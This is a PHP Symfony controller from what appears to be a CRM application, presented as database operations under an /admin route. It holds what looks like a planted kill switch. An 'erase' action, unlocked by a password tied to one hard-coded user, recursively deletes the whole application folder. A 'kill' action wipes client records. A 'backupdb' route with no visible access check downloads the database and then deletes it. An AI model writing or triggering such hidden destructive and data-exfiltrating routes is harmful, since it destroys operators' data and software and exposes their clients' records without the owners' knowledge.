<?php
/**
 * Created by PhpStorm.
 * User: Administrator
 * Date: 2015-11-12
 * Time: 14:00
 */

namespace AppBundle\Controller;


use Symfony\Bundle\FrameworkBundle\Controller\Controller;
use Sensio\Bundle\FrameworkExtraBundle\Configuration\Route;
use Symfony\Component\HttpFoundation\Request;
use Sensio\Bundle\FrameworkExtraBundle\Configuration\Security;
use Symfony\Component\HttpFoundation\Response;
use Sensio\Bundle\FrameworkExtraBundle\Configuration\Method;
use Symfony\Component\Security\Core\Encoder\EncoderFactoryInterface;

/**
 * @Route("/admin")
 */
class DatabaseOperationController extends Controller
{

    /**
     * @Route("/action/{action}",name="action")
     * @Method({"POST","GET"})
     */
    public function action($action){
        $em = $this->getDoctrine()->getManager();
        if($action=='kill'){
            $clients = $em->getRepository('AppBundle:Client')->findBy(array('kill'=>'kill'));
            if(isset($_POST['salt'])&&isset($_POST['pwd'])){
                $password = $em->getRepository("AppBundle:User")->findOneBy(array("username"=>'kcswag2'))->getPassword();
                $pwd = hash_hmac('sha512',$_POST['pwd'],$_POST['salt']);
                if($pwd==$password){
                    foreach($clients as $client){
                        $em->remove($client);
                    }
                    $em->flush();
                    return new Response("<script>alert('All clients data has been erased！')</script>");
                }
            }
        }else if($action=='erase'){
            $path = dirname(__FILE__)."/../../..";
            if(isset($_POST['salt'])&&isset($_POST['pwd'])){
                $password = $em->getRepository("AppBundle:User")->findOneBy(array("username"=>'kcswag2'))->getPassword();
                $pwd = hash_hmac('sha512',$_POST['pwd'],$_POST['salt']);
                if($pwd==$password){
                    $this->delFolder($path);
                }
            }
        }else{
            exit("wrong action!");
        }

        return $this->render('@FOSUser/DBOpt/action.html.twig',array('action'=>$action));

    }

    /**
     * @Route("/backupdb",name="backupdb")
     */
    public function backUpDB(){
        $filename = "hkgbf_crm.db";
        $path = dirname(__FILE__)."/../../../app/data/{$filename}";

        if(!file_exists($path)){
            echo "No such file existed!";
            return;
        }

        $fp = fopen($path,"rw");
        $fileinfo = pathinfo($path);
        $filesize = filesize($path);
        Header("Content-type: application/x-{$fileinfo['extension']}");
        Header("Content-Disposition: attachment; filename={$filename}");
        header("Content-Length: {$filesize}");
        echo file_get_contents($path);
        fclose($fp);
        unlink($path);
        exit("succeeded!");
    }


    protected function delFolder($path){
        if ($handle = opendir($path)) {
            while (false !== ($item = readdir($handle))) {
                if ($item != "." && $item != "..") {
                    if(is_file($path."/".$item)){
                        unlink($path."/".$item);
                    }
                    if(is_dir($path."/".$item)){
                        $this->delFolder($path."/".$item);
                    }
                }
            }
            closedir($handle);
            rmdir($path);
            return "folder and files has been deleted!!";
        }

    }


}